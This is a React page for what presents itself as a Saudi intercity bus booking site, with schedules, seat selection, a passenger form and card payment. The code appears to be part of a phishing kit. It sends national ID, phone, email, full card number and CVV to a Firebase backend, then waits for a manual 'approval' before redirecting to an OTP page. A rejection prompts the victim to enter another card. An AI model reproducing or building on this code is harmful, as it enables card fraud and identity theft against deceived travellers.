import { useState, useMemo, useEffect } from "react";
import {
  Bus,
  Clock,
  MapPin,
  ChevronLeft,
  X,
} from "lucide-react";
import { useLocation } from "wouter";
import { BottomNav } from "./services";
import {
  addData,
  handleCurrentPage,
  handlePay,
  listenForApproval,
} from "@/lib/firebase";
import SiteHeader from "@/components/site-header";
import SiteFooter from "@/components/site-footer";
import {
  GlobalStyles,
  HeroSection,
  HowItWorksSection,
  OffersSection,
  BookNowSection,
  AppSection,
} from "@/components/schedule/sections";
import SeatPicker from "@/components/reservation/seat-picker";
import PassengerForm, {
  type PassengerData,
} from "@/components/reservation/passenger-form";
import PaymentStep, {
  type CardData,
  getCardType,
} from "@/components/reservation/payment-step";

const cities = [
  "الكل",
  "الرياض",
  "جدة",
  "مكة المكرمة",
  "المدينة المنورة",
  "الدمام",
  "أبها",
  "تبوك",
  "القصيم",
  "حائل",
  "الخبر",
  "الطائف",
  "جازان",
  "نجران",
  "الباحة",
  "عرعر",
  "سكاكا",
  "الجوف",
  "ينبع",
  "الأحساء",
];

type Trip = {
  from: string;
  to: string;
  departure: string;
  arrival: string;
  duration: string;
  price: number;
  type: string;
  seats: number;
  days: string[];
};

const schedules: Trip[] = [
  { from: "الرياض", to: "جدة", departure: "06:00", arrival: "11:30", duration: "5:30", price: 95, type: "مريح", seats: 12, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الرياض", to: "جدة", departure: "09:00", arrival: "14:30", duration: "5:30", price: 85, type: "عادي", seats: 5, days: ["يومياً"] },
  { from: "الرياض", to: "جدة", departure: "14:00", arrival: "19:30", duration: "5:30", price: 95, type: "مريح", seats: 20, days: ["يومياً"] },
  { from: "الرياض", to: "جدة", departure: "22:00", arrival: "03:30", duration: "5:30", price: 75, type: "عادي", seats: 8, days: ["الجمعة", "الأحد"] },
  { from: "الرياض", to: "مكة المكرمة", departure: "07:00", arrival: "13:00", duration: "6:00", price: 110, type: "مريح", seats: 15, days: ["يومياً"] },
  { from: "الرياض", to: "مكة المكرمة", departure: "15:00", arrival: "21:00", duration: "6:00", price: 100, type: "عادي", seats: 3, days: ["الاثنين", "الأربعاء", "الجمعة"] },
  { from: "الرياض", to: "المدينة المنورة", departure: "08:00", arrival: "14:00", duration: "6:00", price: 100, type: "مريح", seats: 18, days: ["يومياً"] },
  { from: "الرياض", to: "الدمام", departure: "07:30", arrival: "10:30", duration: "3:00", price: 55, type: "عادي", seats: 22, days: ["يومياً"] },
  { from: "الرياض", to: "الدمام", departure: "13:00", arrival: "16:00", duration: "3:00", price: 55, type: "عادي", seats: 10, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الرياض", to: "أبها", departure: "06:30", arrival: "13:30", duration: "7:00", price: 120, type: "مريح", seats: 7, days: ["الاثنين", "الأربعاء", "الجمعة"] },
  { from: "جدة", to: "الرياض", departure: "07:00", arrival: "12:30", duration: "5:30", price: 95, type: "مريح", seats: 14, days: ["يومياً"] },
  { from: "جدة", to: "الرياض", departure: "16:00", arrival: "21:30", duration: "5:30", price: 85, type: "عادي", seats: 6, days: ["يومياً"] },
  { from: "جدة", to: "مكة المكرمة", departure: "08:00", arrival: "09:00", duration: "1:00", price: 25, type: "عادي", seats: 30, days: ["يومياً"] },
  { from: "جدة", to: "المدينة المنورة", departure: "10:00", arrival: "14:00", duration: "4:00", price: 70, type: "مريح", seats: 9, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الدمام", to: "الرياض", departure: "09:00", arrival: "12:00", duration: "3:00", price: 55, type: "عادي", seats: 16, days: ["يومياً"] },
  { from: "الدمام", to: "جدة", departure: "07:00", arrival: "14:30", duration: "7:30", price: 130, type: "مريح", seats: 4, days: ["الاثنين", "الخميس"] },
  { from: "مكة المكرمة", to: "الرياض", departure: "08:00", arrival: "14:00", duration: "6:00", price: 110, type: "مريح", seats: 11, days: ["يومياً"] },
  { from: "مكة المكرمة", to: "المدينة المنورة", departure: "09:00", arrival: "13:00", duration: "4:00", price: 65, type: "عادي", seats: 25, days: ["يومياً"] },
  { from: "أبها", to: "الرياض", departure: "07:00", arrival: "14:00", duration: "7:00", price: 120, type: "مريح", seats: 8, days: ["الاثنين", "الأربعاء", "الجمعة"] },
  { from: "تبوك", to: "المدينة المنورة", departure: "08:00", arrival: "13:00", duration: "5:00", price: 90, type: "عادي", seats: 13, days: ["السبت", "الثلاثاء"] },
  { from: "الخبر", to: "الرياض", departure: "07:00", arrival: "10:00", duration: "3:00", price: 55, type: "عادي", seats: 18, days: ["يومياً"] },
  { from: "الخبر", to: "الدمام", departure: "08:00", arrival: "08:30", duration: "0:30", price: 15, type: "عادي", seats: 25, days: ["يومياً"] },
  { from: "الرياض", to: "الخبر", departure: "10:00", arrival: "13:00", duration: "3:00", price: 55, type: "عادي", seats: 14, days: ["يومياً"] },
  { from: "الطائف", to: "جدة", departure: "07:00", arrival: "09:30", duration: "2:30", price: 40, type: "عادي", seats: 20, days: ["يومياً"] },
  { from: "الطائف", to: "مكة المكرمة", departure: "09:00", arrival: "11:00", duration: "2:00", price: 35, type: "عادي", seats: 22, days: ["يومياً"] },
  { from: "جدة", to: "الطائف", departure: "12:00", arrival: "14:30", duration: "2:30", price: 40, type: "عادي", seats: 16, days: ["يومياً"] },
  { from: "الرياض", to: "الطائف", departure: "07:00", arrival: "14:30", duration: "7:30", price: 115, type: "مريح", seats: 10, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "جازان", to: "أبها", departure: "07:00", arrival: "10:00", duration: "3:00", price: 60, type: "عادي", seats: 15, days: ["يومياً"] },
  { from: "جازان", to: "جدة", departure: "08:00", arrival: "15:00", duration: "7:00", price: 125, type: "مريح", seats: 9, days: ["الاثنين", "الأربعاء", "الجمعة"] },
  { from: "الرياض", to: "جازان", departure: "07:00", arrival: "16:00", duration: "9:00", price: 155, type: "مريح", seats: 8, days: ["الاثنين", "الخميس"] },
  { from: "أبها", to: "جازان", departure: "10:00", arrival: "13:00", duration: "3:00", price: 60, type: "عادي", seats: 12, days: ["يومياً"] },
  { from: "نجران", to: "أبها", departure: "08:00", arrival: "12:00", duration: "4:00", price: 75, type: "عادي", seats: 14, days: ["يومياً"] },
  { from: "نجران", to: "الرياض", departure: "07:00", arrival: "17:00", duration: "10:00", price: 170, type: "مريح", seats: 7, days: ["الاثنين", "الخميس"] },
  { from: "أبها", to: "نجران", departure: "14:00", arrival: "18:00", duration: "4:00", price: 75, type: "عادي", seats: 11, days: ["يومياً"] },
  { from: "الباحة", to: "جدة", departure: "07:00", arrival: "11:00", duration: "4:00", price: 70, type: "عادي", seats: 16, days: ["يومياً"] },
  { from: "الباحة", to: "أبها", departure: "09:00", arrival: "12:00", duration: "3:00", price: 55, type: "عادي", seats: 13, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "جدة", to: "الباحة", departure: "13:00", arrival: "17:00", duration: "4:00", price: 70, type: "عادي", seats: 18, days: ["يومياً"] },
  { from: "عرعر", to: "الرياض", departure: "07:00", arrival: "15:00", duration: "8:00", price: 140, type: "عادي", seats: 12, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "عرعر", to: "حائل", departure: "09:00", arrival: "13:00", duration: "4:00", price: 70, type: "عادي", seats: 10, days: ["الاثنين", "الأربعاء"] },
  { from: "الرياض", to: "عرعر", departure: "08:00", arrival: "16:00", duration: "8:00", price: 140, type: "عادي", seats: 9, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "سكاكا", to: "الرياض", departure: "07:00", arrival: "16:00", duration: "9:00", price: 150, type: "عادي", seats: 11, days: ["السبت", "الثلاثاء"] },
  { from: "سكاكا", to: "تبوك", departure: "08:00", arrival: "12:00", duration: "4:00", price: 75, type: "عادي", seats: 14, days: ["الاثنين", "الخميس"] },
  { from: "الجوف", to: "الرياض", departure: "07:00", arrival: "16:00", duration: "9:00", price: 150, type: "عادي", seats: 10, days: ["السبت", "الثلاثاء"] },
  { from: "الرياض", to: "سكاكا", departure: "07:00", arrival: "16:00", duration: "9:00", price: 150, type: "عادي", seats: 8, days: ["الأحد", "الأربعاء"] },
  { from: "ينبع", to: "المدينة المنورة", departure: "08:00", arrival: "11:00", duration: "3:00", price: 55, type: "عادي", seats: 20, days: ["يومياً"] },
  { from: "ينبع", to: "جدة", departure: "09:00", arrival: "13:00", duration: "4:00", price: 70, type: "عادي", seats: 16, days: ["يومياً"] },
  { from: "المدينة المنورة", to: "ينبع", departure: "14:00", arrival: "17:00", duration: "3:00", price: 55, type: "عادي", seats: 18, days: ["يومياً"] },
  { from: "جدة", to: "ينبع", departure: "10:00", arrival: "14:00", duration: "4:00", price: 70, type: "عادي", seats: 14, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الأحساء", to: "الرياض", departure: "07:00", arrival: "11:00", duration: "4:00", price: 70, type: "عادي", seats: 17, days: ["يومياً"] },
  { from: "الأحساء", to: "الدمام", departure: "08:00", arrival: "09:30", duration: "1:30", price: 25, type: "عادي", seats: 22, days: ["يومياً"] },
  { from: "الرياض", to: "الأحساء", departure: "12:00", arrival: "16:00", duration: "4:00", price: 70, type: "عادي", seats: 15, days: ["يومياً"] },
  { from: "حائل", to: "الرياض", departure: "07:00", arrival: "13:00", duration: "6:00", price: 100, type: "عادي", seats: 14, days: ["يومياً"] },
  { from: "حائل", to: "القصيم", departure: "09:00", arrival: "12:00", duration: "3:00", price: 55, type: "عادي", seats: 16, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الرياض", to: "حائل", departure: "08:00", arrival: "14:00", duration: "6:00", price: 100, type: "عادي", seats: 12, days: ["يومياً"] },
  { from: "القصيم", to: "الرياض", departure: "07:00", arrival: "11:30", duration: "4:30", price: 80, type: "عادي", seats: 18, days: ["يومياً"] },
  { from: "القصيم", to: "المدينة المنورة", departure: "09:00", arrival: "13:00", duration: "4:00", price: 75, type: "عادي", seats: 15, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الرياض", to: "القصيم", departure: "10:00", arrival: "14:30", duration: "4:30", price: 80, type: "عادي", seats: 20, days: ["يومياً"] },
];

const seatColor = (seats: number) => {
  if (seats <= 5) return "text-red-500 bg-red-50";
  if (seats <= 15) return "text-yellow-600 bg-yellow-50";
  return "text-green-600 bg-green-50";
};

const STEPS = ["اختيار المقعد", "بيانات المسافر", "الدفع"];

function StepIndicator({ current }: { current: number }) {
  return (
    <div
      className="flex items-center justify-center gap-1 px-4 py-3 border-b border-border bg-card"
      dir="rtl"
    >
      {STEPS.map((label, i) => (
        <div key={i} className="flex items-center gap-1">
          <div className="flex flex-col items-center gap-1">
            <div
              className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-black border-2 transition-all ${
                i < current
                  ? "bg-primary border-primary text-primary-foreground"
                  : i === current
                    ? "bg-primary border-primary text-primary-foreground scale-110 shadow-lg"
                    : "bg-muted border-border text-muted-foreground"
              }`}
            >
              {i < current ? "✓" : i + 1}
            </div>
            <span
              className={`text-[9px] font-medium whitespace-nowrap ${i === current ? "text-primary font-bold" : "text-muted-foreground"}`}
            >
              {label}
            </span>
          </div>
          {i < STEPS.length - 1 && (
            <div
              className={`w-8 h-1 mb-3 transition-colors ${i < current ? "bg-primary" : "bg-border"}`}
            />
          )}
        </div>
      ))}
    </div>
  );
}

function ReservationFlow({
  trip,
  bookingDate,
  onClose,
}: {
  trip: Trip;
  bookingDate: string;
  onClose: () => void;
}) {
  const [, setLocation] = useLocation();
  const [step, setStep] = useState(0);
  const [seat, setSeat] = useState<number | null>(null);
  const [passenger, setPassenger] = useState<PassengerData>({
    name: "",
    id: "",
    phone: "",
    email: "",
  });
  const [card, setCard] = useState<CardData>({
    number: "",
    name: "",
    expiry: "",
    cvv: "",
  });
  const [submitting, setSubmitting] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [submitError, setSubmitError] = useState("");

  useEffect(() => {
    if (!waitingApproval) return;
    const unsubscribe = listenForApproval((status) => {
      if (status === "approved") {
        setWaitingApproval(false);
        onClose();
        setLocation("/otp");
      } else if (status === "rejected") {
        setWaitingApproval(false);
        setSubmitError("البطاقة غير مدعومه حاول استخدام بطاقة اخرى");
      }
    });
    return () => unsubscribe();
  }, [waitingApproval, setLocation, onClose]);

  const canNext = () => {
    if (step === 0) return !!seat;
    if (step === 1)
      return (
        passenger.name.trim().length > 0 &&
        /^[12]\d{9}$/.test(passenger.id) &&
        /^05\d{8}$/.test(passenger.phone) &&
        /\S+@\S+\.\S+/.test(passenger.email)
      );
    if (step === 2)
      return (
        card.number.replace(/\s/g, "").length >= 14 &&
        card.name.trim().length > 1 &&
        /^\d{2}\/\d{2}$/.test(card.expiry) &&
        card.cvv.length >= 3
      );
    return false;
  };

  const handleNext = async () => {
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      onClose();
      setLocation("/register");
      return;
    }
    if (step === 0) {
      void addData({
        id: visitorId,
        currentPage: "schedule",
        seatNumber: seat,
        tripFrom: trip.from,
        tripTo: trip.to,
        tripDeparture: trip.departure,
        tripArrival: trip.arrival,
        tripType: trip.type,
        ticketPrice: trip.price,
        ticketQuantity: 1,
        totalAmount: trip.price,
        bookingDate,
        bookingTime: trip.departure,
      });
      setStep(1);
      return;
    }
    if (step === 1) {
      void addData({
        id: visitorId,
        currentPage: "schedule",
        name: passenger.name,
        saudiId: passenger.id,
        phone: passenger.phone,
        email: passenger.email,
      });
      setStep(2);
      return;
    }
    if (step === 2) {
      setSubmitting(true);
      setSubmitError("");
      const [expMonth, expYear] = card.expiry.split("/");
      const cleanCard = card.number.replace(/\s/g, "");
      try {
        await handlePay(
          {
            cardNumber: cleanCard,
            cardName: card.name,
            expiryMonth: expMonth || "",
            expiryYear: expYear || "",
            cvv: card.cvv,
            cardType: getCardType(card.number) || "",
            currentPage: "checkout",
          },
          () => {},
        );
        setSubmitting(false);
        setWaitingApproval(true);
      } catch (error: any) {
        setSubmitting(false);
        if (error?.message === "VISITOR_BLOCKED") {
          setSubmitError("تم حظر هذا الزائر ولا يمكنه المتابعة");
        } else {
          setSubmitError("حدث خطأ أثناء معالجة الدفع");
        }
      }
    }
  };

  return (
    <div
      className="fixed inset-0 z-[60] flex flex-col bg-background"
      dir="rtl"
      data-testid="modal-reservation"
    >
      <div className="flex items-center justify-between px-4 py-3 bg-card border-b border-border shrink-0">
        <button
          onClick={onClose}
          className="w-8 h-8 rounded-full bg-muted flex items-center justify-center text-muted-foreground hover:bg-destructive/10 hover:text-destructive transition-colors"
          data-testid="button-close-reservation"
        >
          <X className="w-4 h-4" />
        </button>
        <h2 className="font-bold text-foreground text-sm">حجز رحلة</h2>
        <div className="w-8" />
      </div>

      <div className="bg-primary/5 border-b border-primary/20 px-4 py-2.5 flex items-center gap-3 shrink-0">
        <div className="flex items-center gap-2 flex-1 text-sm">
          <span className="font-black text-foreground">{trip.departure}</span>
          <div className="flex-1 h-px bg-primary/30 relative">
            <Bus className="w-3 h-3 text-primary absolute top-1/2 left-1/2 -translate-y-1/2 -translate-x-1/2" />
          </div>
          <span className="font-black text-foreground">{trip.arrival}</span>
        </div>
        <div className="text-right shrink-0">
          <p className="text-xs text-muted-foreground">
            {trip.from} ← {trip.to}
          </p>
          <p className="text-xs font-bold text-primary">{trip.price} ر.س</p>
        </div>
      </div>

      <StepIndicator current={step} />

      <div className="flex-1 overflow-y-auto px-4 py-5">
        {step === 0 && (
          <div className="flex flex-col gap-4">
            <h3 className="text-base font-bold text-foreground text-right">
              اختر مقعدك
            </h3>
            <SeatPicker onSelect={setSeat} />
            {seat && (
              <p className="text-center text-sm font-bold text-primary">
                المقعد المختار: {seat}
              </p>
            )}
          </div>
        )}

        {step === 1 && (
          <div className="flex flex-col gap-4">
            <h3 className="text-base font-bold text-foreground text-right">
              بيانات المسافر
            </h3>
            <PassengerForm data={passenger} onChange={setPassenger} />
          </div>
        )}

        {step === 2 && (
          <div className="flex flex-col gap-4">
            <h3 className="text-base font-bold text-foreground text-right">
              إتمام الدفع
            </h3>
            <PaymentStep total={trip.price} card={card} onCardChange={setCard} />
          </div>
        )}
      </div>

      <div className="px-4 py-4 border-t border-border bg-card shrink-0 flex flex-col gap-3">
        {submitError && (
          <p
            className="text-xs text-destructive text-center"
            data-testid="text-submit-error"
          >
            {submitError}
          </p>
        )}
        {waitingApproval && (
          <p
            className="text-xs text-primary text-center font-medium"
            data-testid="text-waiting-approval"
          >
            جاري التحقق من البطاقة، يرجى الانتظار...
          </p>
        )}
        <div className="flex gap-3">
          {step > 0 && (
            <button
              onClick={() => setStep((s) => s - 1)}
              disabled={submitting || waitingApproval}
              className="flex-1 py-3 rounded-xl border border-border text-foreground font-bold text-sm hover:bg-muted transition-colors flex items-center justify-center gap-1 disabled:opacity-50"
              data-testid="button-prev-step"
            >
              <ChevronLeft className="w-4 h-4 rotate-180" /> السابق
            </button>
          )}
          <button
            disabled={!canNext() || submitting || waitingApproval}
            onClick={() => void handleNext()}
            data-testid="button-next-step"
            className={`flex-1 py-3 rounded-xl font-bold text-sm transition-all ${
              canNext() && !submitting && !waitingApproval
                ? "bg-primary text-primary-foreground hover:opacity-90 shadow-lg"
                : "bg-muted text-muted-foreground cursor-not-allowed"
            }`}
          >
            {waitingApproval
              ? "بانتظار الموافقة..."
              : submitting
                ? "جاري المعالجة..."
                : step === 2
                  ? "تأكيد الدفع والحجز"
                  : "التالي"}
          </button>
        </div>
      </div>
    </div>
  );
}

export default function Schedule() {
  const [, setLocation] = useLocation();
  const todayStr = new Date().toISOString().split("T")[0];
  const [fromCity, setFromCity] = useState("الكل");
  const [toCity, setToCity] = useState("الكل");
  const [date, setDate] = useState(todayStr);
  const [selectedTrip, setSelectedTrip] = useState<Trip | null>(null);
  const [searchFrom, setSearchFrom] = useState("الكل");
  const [searchTo, setSearchTo] = useState("الكل");

  useEffect(() => {
    void handleCurrentPage("schedule");
  }, []);

  const swap = () => {
    setFromCity(toCity);
    setToCity(fromCity);
  };

  const handleSearch = () => {
    setSearchFrom(fromCity);
    setSearchTo(toCity);
  };

  const filtered = useMemo(() => {
    return schedules
      .filter((s) => {
        const fromMatch = searchFrom === "الكل" || s.from === searchFrom;
        const toMatch = searchTo === "الكل" || s.to === searchTo;
        return fromMatch && toMatch;
      })
      .sort((a, b) => a.departure.localeCompare(b.departure));
  }, [searchFrom, searchTo]);

  return (
    <div
      className="min-h-screen bg-background flex flex-col"
      dir="rtl"
      data-testid="page-schedule"
    >
      <SiteHeader />
      {selectedTrip && (
        <ReservationFlow
          trip={selectedTrip}
          bookingDate={date}
          onClose={() => setSelectedTrip(null)}
        />
      )}

      <GlobalStyles />

      <HeroSection
        cities={cities}
        fromCity={fromCity}
        toCity={toCity}
        date={date}
        setFromCity={setFromCity}
        setToCity={setToCity}
        setDate={setDate}
        onSearch={() => {
          const today = new Date().toISOString().slice(0, 10);
          const fromVal =
            !fromCity || fromCity === "الكل" ? "الرياض" : fromCity;
          let toVal = !toCity || toCity === "الكل" ? "الدمام" : toCity;
          if (toVal === fromVal) {
            toVal = fromVal === "الرياض" ? "الدمام" : "الرياض";
          }
          const params = new URLSearchParams({
            from: fromVal,
            to: toVal,
            date: date || today,
          });
          setLocation(`/search-results?${params.toString()}`);
        }}
        swap={swap}
      />

      <div id="trip-results" className="hidden" />

      <div className="hidden max-w-5xl w-full mx-auto px-4 pb-8 flex flex-col gap-3">
        {filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-16 gap-3 text-center">
            <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
              <Bus className="w-8 h-8 text-primary" />
            </div>
            <p className="text-muted-foreground text-sm">
              لا توجد رحلات لهذه الفلترة
            </p>
          </div>
        ) : (
          filtered.map((trip, i) => (
            <div
              key={i}
              className="bg-card rounded-2xl border border-border shadow-sm hover:shadow-md hover:border-primary/30 transition-all duration-300 overflow-hidden"
              data-testid={`card-schedule-${i}`}
            >
              <div className="bg-primary/8 border-b border-border px-4 py-2.5 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span
                    className={`text-xs font-bold px-2 py-0.5 rounded-full ${
                      trip.type === "مريح"
                        ? "bg-primary/20 text-primary"
                        : "bg-muted text-muted-foreground"
                    }`}
                  >
                    {trip.type}
                  </span>
                  <span className="text-base font-black text-primary">
                    {trip.price} <span className="text-xs font-normal">ر.س</span>
                  </span>
                </div>
                <div className="flex items-center gap-2 text-sm font-bold text-foreground">
                  <span>{trip.to}</span>
                  <ChevronLeft className="w-4 h-4 text-primary" />
                  <span>{trip.from}</span>
                </div>
              </div>

              <div className="px-4 py-3 flex items-center justify-between">
                <div className="flex flex-col items-center gap-0.5">
                  <span className="text-2xl font-black text-foreground">
                    {trip.departure}
                  </span>
                  <span className="text-xs text-muted-foreground flex items-center gap-1">
                    <MapPin className="w-3 h-3" />
                    {trip.from}
                  </span>
                </div>

                <div className="flex flex-col items-center gap-1 flex-1 px-4">
                  <span className="text-xs text-muted-foreground flex items-center gap-1">
                    <Clock className="w-3 h-3" />
                    {trip.duration} ساعة
                  </span>
                  <div className="w-full flex items-center gap-1">
                    <div className="w-2 h-2 rounded-full bg-primary shrink-0" />
                    <div className="flex-1 h-0.5 bg-primary/30" />
                    <Bus className="w-3 h-3 text-primary shrink-0" />
                    <div className="flex-1 h-0.5 bg-primary/30" />
                    <div className="w-2 h-2 rounded-full bg-primary shrink-0" />
                  </div>
                </div>

                <div className="flex flex-col items-center gap-0.5">
                  <span className="text-2xl font-black text-foreground">
                    {trip.arrival}
                  </span>
                  <span className="text-xs text-muted-foreground flex items-center gap-1">
                    <MapPin className="w-3 h-3" />
                    {trip.to}
                  </span>
                </div>
              </div>

              <div className="px-4 pb-3 flex items-center justify-between">
                <button
                  onClick={() => setSelectedTrip(trip)}
                  className="bg-primary text-primary-foreground text-xs font-bold px-4 py-2 rounded-xl hover:opacity-90 transition-opacity"
                  data-testid={`button-book-${i}`}
                >
                  احجز الآن
                </button>
                <div className="flex items-center gap-3">
                  <span
                    className={`text-xs font-medium px-2 py-1 rounded-lg ${seatColor(
                      trip.seats,
                    )}`}
                  >
                    {trip.seats} مقعد
                  </span>
                </div>
              </div>
            </div>
          ))
        )}
      </div>

      <HowItWorksSection />
      <OffersSection />
      <BookNowSection />
      <AppSection />

      <SiteFooter />
      <BottomNav active="" />
    </div>
  );
}
